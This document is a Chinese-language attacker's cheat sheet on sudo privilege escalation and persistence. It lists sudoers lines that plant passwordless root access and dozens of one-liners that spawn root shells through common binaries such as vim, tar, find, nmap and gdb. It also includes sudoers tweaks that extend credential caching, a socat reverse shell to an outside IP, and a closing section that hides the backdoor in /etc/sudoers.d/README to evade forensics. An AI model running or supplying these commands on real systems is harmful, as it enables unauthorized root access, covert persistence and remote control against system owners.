# sudo提权

基本上都要动/etc/sudoers，很容易在取证时被发现。

## sudo配置不当

| 命令                                                         | 类型             |
| ------------------------------------------------------------ | ---------------- |
| root:  echo "aplyc1a ALL=(root) ALL" >> /etc/sudoers         | sudo配置不当提权 |
| root:  echo "aplyc1a ALL=(ALL:ALL) ALL" >> /etc/sudoers      | sudo配置不当提权 |
| root:  echo "aplyc1a ALL=(ALL:ALL) NOPASSWD:/usr/bin/vi" >>  /etc/sudoers | sudo配置不当提权 |

## sudo命令提权

```shell
echo "aplyc1a ALL=(root) NOPASSWD:/usr/bin/*,/usr/sbin/*" >>  /etc/sudoers
```

| 命令                                                         | 类型         |
| ------------------------------------------------------------ | ------------ |
| aplyc1a: sudo zip ./7.zip /tmp -T  --unzip-command="sh -c /bin/bash" | sudo命令提权 |
| aplyc1a: sudo tar cf /dev/null  test.tar --checkpoint=1 --checkpoint-action=exec=/bin/bash | sudo命令提权 |
| aplyc1a: sudo more  /etc/rsyslog.conf<br>!/bin/bash          | sudo命令提权 |
| aplyc1a: sudo less  /etc/rsyslog.conf<br/>!/bin/bash         | sudo命令提权 |
| aplyc1a: sudo man ssh<br/>!/bin/bash                         | sudo命令提权 |
| aplyc1a: sudo ftp<br/>!/bin/bash                             | sudo命令提权 |
| aplyc1a: sudo vim -c '!sh'                                   | sudo命令提权 |
| aplyc1a: sudo vim<br/>:set shell=/bin/bash<br/>:shell        | sudo命令提权 |
| aplyc1a: sudo find /bin name . -exec '/bin/bash' \;          | sudo命令提权 |
| aplyc1a: echo "os.execute('/bin/bash')" > /tmp/shell.nse<br/>aplyc1a: sudo nmap --script=/tmp/shell.nse | sudo命令提权 |
| aplyc1a: sudo git help status<br/>!/bin/bash                 | sudo命令提权 |
| aplyc1a: sudo passwd                                         | sudo命令提权 |
| aplyc1a: sudo awk 'BEGIN{system("/bin/bash")}'               | sudo命令提权 |
| aplyc1a: sudo /usr/bin/python -c 'import  pty;pty.spawn("/bin/bash")' | sudo命令提权 |
| aplyc1a: sudo bash                                           | sudo命令提权 |
| aplyc1a: sudo csh -b                                         | sudo命令提权 |
| aplyc1a: sudo dmesg -H     !/bin/sh                          | sudo命令提权 |
| aplyc1a: sudo env /bin/sh -p                                 | sudo命令提权 |
| aplyc1a: sudo flock -u / /bin/sh -p                          | sudo命令提权 |
| aplyc1a: sudo gdb -nx -ex 'python import  os;os.execl("/bin/sh","sh","-p")' -ex quit | sudo命令提权 |
| aplyc1a:sudo ed     !/bin/sh -p                              | sudo命令提权 |
| aplyc1a:sudo expect -c 'spawn /bin/sh -p; interact'     !/bin/sh -p |              |
| aplyc1a:sudo ionice /bin/sh -p                               | sudo命令提权 |
| aplyc1a:sudo ip netns add foo<br/>aplyc1a:sudo ip netns exec foo /bin/sh -p<br/>#sudo ip netns delete foo | sudo命令提权 |
| aplyc1a:sudo ksh -p                                          | sudo命令提权 |
| aplyc1a:sudo logsave /dev/null /bin/sh -i -p                 | sudo命令提权 |
| aplyc1a:COMMAND='/bin/sh -p'<br/>aplyc1a:make -s --eval=$'x:\n\t-'"$COMMAND" | sudo命令提权 |
| aplyc1a:sudo nano<br/>ctrl R<br/>CTRL X<br/>reset;sh -p 1>&0 2>&0 | sudo命令提权 |
| aplyc1a:sudo nice /bin/sh -p                                 | sudo命令提权 |
| aplyc1a:CMD="/bin/sh"<br/>aplyc1a:sudo php -r "pcntl_exec('/bin/sh', ['-p']);" | sudo命令提权 |
| aplyc1a: sudo rpm --eval '%{lua:os.execute("/bin/sh -p")}'   | sudo命令提权 |
| aplyc1a: sudo rsync -e 'sh -p -c "sh -p 0<&2 1>&2"'  127.0.0.1:/dev/null | sudo命令提权 |
| aplyc1a: setarch $(arch) /bin/sh -p                          | sudo命令提权 |
| attacker: socat file:'/dev/tty',raw,echo=0 tcp-listen:8888<br/>aplyc1a: sudo socat tcp-connect:87.65.43.21:8888 exec:'/bin/sh -p',pty,stderr | sudo命令提权 |
| aplyc1a: sudo ssh -o ProxyCommand=';sh -p 0<&2 1>&2' x       | sudo命令提权 |
| aplyc1a: sudo strace -o /dev/null /bin/sh -p                 |              |
| aplyc1a: sudo stdbuf -i0 /bin/sh -p                          | sudo命令提权 |
| aplyc1a: sudo taskset 1 /bin/sh -p                           | sudo命令提权 |
| aplyc1a: sudo tclsh<br/>aplyc1a: exec /bin/sh -p <@stdin >@stdout 2>@stderr | sudo命令提权 |
| aplyc1a: sudo time /bin/sh -p                                | sudo命令提权 |
| aplyc1a: sudo watch -x sh -c 'reset; exec sh -p 1>&0 2>&0'   | sudo命令提权 |
| aplyc1a: sudo xargs -a /dev/null sh -p                       | sudo命令提权 |
| aplyc1a: sudo zsh                                            | sudo命令提权 |
| aplyc1a: sudo ftp<br/>aplyc1a:!/bin/bash                     | sudo命令提权 |

## sudo缓存提权

| 命令                                                         | 类型         |
| ------------------------------------------------------------ | ------------ |
| root:  echo "Defaults timestamp_timeout=-1" >> /etc/sudoers  | sudo缓存提权 |
| root:  echo "Defaults "'!'"tty_tickets" >> /etc/sudoers      | sudo缓存提权 |
| root:  echo "Defaults:walrus   !authenticate" >> /etc/sudoers | sudo缓存提权 |

## 增强隐蔽性

```shell
echo "aplyc1a ALL=(root) NOPASSWD:/usr/bin/*,/usr/sbin/*" >>  /etc/sudoers.d/README
```





